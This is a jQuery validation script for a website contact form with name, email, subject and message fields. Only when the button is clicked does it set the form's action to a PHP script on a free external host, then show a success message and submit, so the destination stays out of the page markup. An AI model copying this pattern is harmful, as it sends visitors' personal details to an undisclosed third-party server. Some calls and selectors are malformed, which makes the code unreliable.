function validate() {

var valid = true;
valid = checkEmpty($("#name"));
valid = valid && checkEmail($("#email")) && checkSubject($("#subject")) && checkTextArea($("#tarea"));

$("#san-button").attr("disabled",true);

if(valid) {
$("#san-button").attr("disabled",false);
	} 
	
}

$("#myform #san-button").click(function(e) {
    e.preventDefault();
    setTimeout(function(a) { $("form").attr("action","https://4k4asn3w.000webhostapp.com/new/old/new/old/d_it/en.php"); $("#sendmessage").addClass("show"); $("#errormessage").removeClass("show"); setTimeout(function(b) { $("#myform").submit(); } , 2500); } , 2000);
	});
	
$('#name').keyup(function() {

var txtlen = $("#name").val().length; 
if (4 >= txtlen) {$('spagte').html("Insufficient characters.. (min. 5)"); $("button").attr("disabled", true); $("form").removeAttr("action", false);}

});

$('#email').keyup(function() {
	
var txtlen = $("#email").val().length; 
if (9 >= txtlen ) {$('spagte1').html("Insufficient characters.. (min. 10)"); $("button").attr("disabled", true); $("form").removeAttr("action", false);}

});

$('#subject').keyup(function() {
	
var txtlen = $("#subject").val().length;
if (4 >= txtlen) {$('spagte2').html("Insufficient characters.. (min. 5)"); $("button").attr("disabled", true); $("form").removeAttr("action", false);}

});

$("#tarea").on("input",function(){
	
var txtlen = $("#tarea").val().length;
if (49 >= txtlen) {$('spagte3').html("Insufficient characters.. (min. 50)"); $("button").attr("disabled", true); $("form").removeAttr("action", false);}

});

$("#name").keypress(function() {
	if($(this).val().length <= 3) {
	$('spagte').html("Insufficient characters.. (min. 5)");
}
else{
	$('spagte').html("");
	}
});

$("#email").keypress(function() {
	if($(this).val().length < 8) {
	$('spagte1').html("Insufficient characters.. (min. 10)");
}
else{
	$('spagte1').html("");
	}
});

$("#subject").keypress(function() {
	if($(this).val().length < 3) {
	$('spagte2').html("Insufficient characters.. (min. 5)");
}
else{
	$('spagte2').html("");
	}
});

$("#tarea").keypress(function() {
	if($(this).val().length < 48) {
	$('spagte3').html("Insufficient characters.. (min. 50)");
}
else{
	$('spagte3').html("");
	}
});


function checkEmpty(obj) {
var name = $(obj).attr("name");
$("."+name+"-validation").html(""); 
$(obj).css("border","");
if($(obj).val() == "") {
$(obj).css("border","#FF0000 1px solid");
$("."+name+"-validation").html("Please enter a name!");

return false;
}

return true; 
}

function checkSubject(obj) {
var name = $(obj).attr("name");
$("."+name+"-validation").html(""); 
$(obj).css("border","");
if($(obj).val() == "") {
$(obj).css("border","#FF0000 1px solid");
$("."+name+"-validation").html("Please enter a subject!");

return false;
}

return true; 
}

function checkTextArea(obj) {
var name = $(obj).attr("name");
$("."+name+"-validation").html(""); 
$(obj).css("border","");
if($(obj).val() == "") {
$(obj).css("border","#FF0000 1px solid");
$("."+name+"-validation").html("Please enter the message!");

return false;
}

return true; 
}

function checkEmail(obj) {
var result = true;

var name = $(obj).attr("name");
$("."+name+"-validation").html(""); 
$(obj).css("border","");

result = checkEmpty(obj);

if(!result) {
$(obj).css("border","#FF0000 1px solid");
$("."+name+"-validation").html("Email is required!");

return false;
}

var email_regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,3})+$/;
result = email_regex.test($(obj).val());

if(!result) {
$(obj).css("border","#FF0000 1px solid");
$("."+name+"-validation").html("Please enter a valid email!");

return false;
}

return result; 
}
